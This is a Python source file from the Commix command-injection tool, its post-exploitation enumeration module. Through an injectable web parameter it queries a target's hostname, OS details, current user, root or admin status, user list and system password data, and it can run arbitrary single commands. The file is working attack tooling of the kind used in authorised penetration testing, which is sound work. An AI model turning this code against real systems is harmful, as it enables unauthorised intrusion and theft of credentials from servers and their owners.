#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.core.parse import cmdline as menu
from src.utils import settings
from src.core.controller import checks
from src.core.controller import execution

"""
Powershell's version number enumeration (for Windows OS)
"""
def powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  injector = execution.select_injector(technique)
  cmd = settings.PS_VERSION
  if not settings.TIME_RELATED_ATTACK and interpreter:
    cmd = checks.escape_single_quoted_cmd(cmd)
  execute_cmd = execution.make_execute_cmd(injector, separator, maxlen, TAG, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique, OUTPUT_TEXTFILE)
  ps_version, fresh = execute_cmd(cmd)
  checks.print_ps_version(ps_version, filename, settings.TIME_RELATED_ATTACK and fresh)

"""
Hostname enumeration
"""
def hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  injector = execution.select_injector(technique)
  # Chosen for this target, not written over the constant: these are read again for the next one.
  cmd = settings.WIN_HOSTNAME if settings.TARGET_OS == settings.OS.WINDOWS else settings.HOSTNAME
  execute_cmd = execution.make_execute_cmd(injector, separator, maxlen, TAG, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique, OUTPUT_TEXTFILE)
  shell, fresh = execute_cmd(cmd)
  checks.print_hostname(shell, filename, settings.TIME_RELATED_ATTACK and fresh)

"""
Retrieve system information
"""
def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  injector = execution.select_injector(technique)
  # Chosen for this target, not written over the constant: these are read again for the next one.
  cmd = settings.WIN_RECOGNISE_OS if settings.TARGET_OS == settings.OS.WINDOWS else settings.RECOGNISE_OS
  if not settings.TIME_RELATED_ATTACK and settings.TARGET_OS == settings.OS.WINDOWS and interpreter:
    cmd = "cmd /c " + cmd
  execute_cmd = execution.make_execute_cmd(injector, separator, maxlen, TAG, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique, OUTPUT_TEXTFILE)
  target_os, fresh = execute_cmd(cmd)

  if settings.TIME_RELATED_ATTACK and settings.VERBOSITY_LEVEL == 0 and fresh:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)

  if target_os:
    if settings.TARGET_OS != settings.OS.WINDOWS:
      cmd = settings.DISTRO_INFO
      if not settings.TIME_RELATED_ATTACK and settings.USE_BACKTICKS:
        cmd = checks.remove_command_substitution(cmd)
      distro_name, distro_fresh = execute_cmd(cmd)
      fresh = fresh or distro_fresh
      if distro_name:
        target_os = target_os + settings.SINGLE_WHITESPACE + distro_name

    cmd = settings.WIN_RECOGNISE_HP if settings.TARGET_OS == settings.OS.WINDOWS else settings.RECOGNISE_HP
    if settings.TIME_RELATED_ATTACK and settings.VERBOSITY_LEVEL == 0 and fresh:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    target_arch, arch_fresh = execute_cmd(cmd)
    fresh = fresh or arch_fresh
  else:
    target_arch = None
  checks.print_os_info(target_os, target_arch, filename, settings.TIME_RELATED_ATTACK and fresh)

"""
The current user enumeration
"""
def current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  injector = execution.select_injector(technique)
  # Chosen for this target, not written over the constant: it is read again for the next one.
  cmd = settings.WIN_CURRENT_USER if settings.TARGET_OS == settings.OS.WINDOWS else settings.CURRENT_USER
  execute_cmd = execution.make_execute_cmd(injector, separator, maxlen, TAG, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique, OUTPUT_TEXTFILE)
  cu_account, fresh = execute_cmd(cmd)
  checks.print_current_user(cu_account, filename, settings.TIME_RELATED_ATTACK and fresh)

"""
Check if the Current user is privileged.
"""
def check_current_user_privs(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  injector = execution.select_injector(technique)
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.IS_ADMIN
  else:
    cmd = settings.IS_ROOT
    if settings.USE_BACKTICKS:
      cmd = checks.remove_command_substitution(cmd)
  """
  Undo the padding the Windows interpreter payload writes around its output, and only that.

  Nothing else pads, and taking a character off either end regardless turned a user id of '0' into
  an empty string - root, reported as having no elevated privileges.
  """
  def trim_marker(shell):
    if shell.startswith(settings.SINGLE_WHITESPACE) and shell.endswith(settings.SINGLE_WHITESPACE):
      return shell.strip()
    return shell
  execute_cmd = execution.make_execute_cmd(injector, separator, maxlen, TAG, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique, OUTPUT_TEXTFILE, postprocess=trim_marker)
  shell, fresh = execute_cmd(cmd)
  checks.print_current_user_privs(shell, filename, settings.TIME_RELATED_ATTACK and fresh)

"""
System users enumeration
"""
def system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  injector = execution.select_injector(technique)
  cmd = settings.SYS_USERS
  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd = settings.WIN_SYS_USERS
    if settings.TIME_RELATED_ATTACK:
      cmd = cmd + settings.WIN_REPLACE_WHITESPACE
    if interpreter:
      cmd = checks.escape_single_quoted_cmd(cmd)
    if not settings.TIME_RELATED_ATTACK:
      cmd = checks.add_new_cmd(cmd)
  execute_cmd = execution.make_execute_cmd(injector, separator, maxlen, TAG, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique, OUTPUT_TEXTFILE, catch_time_error=True)
  sys_users, fresh = execute_cmd(cmd)
  checks.print_users(sys_users, filename, settings.TIME_RELATED_ATTACK and fresh, separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter)

"""
System passwords enumeration
"""
def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  injector = execution.select_injector(technique)
  cmd = settings.SYS_PASSES
  drop_false = lambda sys_passes: "" if sys_passes == False else sys_passes
  execute_cmd = execution.make_execute_cmd(injector, separator, maxlen, TAG, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique, OUTPUT_TEXTFILE, postprocess_time=drop_false)
  sys_passes, fresh = execute_cmd(cmd)
  checks.print_passes(sys_passes, filename, settings.TIME_RELATED_ATTACK and fresh, interpreter)

"""
Single os-shell execution
"""
def single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  injector = execution.select_injector(technique)
  execute_cmd = execution.make_execute_cmd(injector, separator, maxlen, TAG, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique, OUTPUT_TEXTFILE)
  # Run the command, and let a freshly executed one settle before the next.
  def wrapped(cmd):
    shell, fresh = execute_cmd(cmd)
    if fresh and settings.TIME_RELATED_ATTACK and settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    return shell
  checks.run_single_os_cmd(wrapped, filename)

"""
Check the defined options
"""
def do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  # Check if PowerShell is enabled.
  if not menu.options.ps_version and settings.TARGET_OS == settings.OS.WINDOWS:
    checks.ps_check()

  if menu.options.ps_version and settings.PS_ENABLED == None:
    if not checks.ps_incompatible_os():
      checks.print_enumenation().ps_version_msg()
      powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
      settings.ENUMERATION_DONE = True

  if menu.options.hostname:
    checks.print_enumenation().hostname_msg()
    hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
    settings.ENUMERATION_DONE = True

  if menu.options.current_user:
    checks.print_enumenation().current_user_msg()
    current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
    settings.ENUMERATION_DONE = True

  if menu.options.is_root or menu.options.is_admin:
    checks.print_enumenation().check_privs_msg()
    check_current_user_privs(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
    settings.ENUMERATION_DONE = True

  if menu.options.sys_info:
    checks.print_enumenation().os_info_msg()
    system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
    settings.ENUMERATION_DONE = True

  if menu.options.users or menu.options.privileges:
    checks.print_enumenation().print_users_msg()
    system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
    settings.ENUMERATION_DONE = True

  if menu.options.passwords:
    if settings.TARGET_OS == settings.OS.WINDOWS:
      check_option = "--passwords"
      checks.unavailable_option(check_option)
    else:
      checks.print_enumenation().print_passes_msg()
      system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)
    settings.ENUMERATION_DONE = True

"""
Check stored session
"""
def stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
  # Target-wide - run once, on the first successful technique.
  if not settings.ENUMERATION_DONE and menu.enumeration_options():
    do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique)

# eof
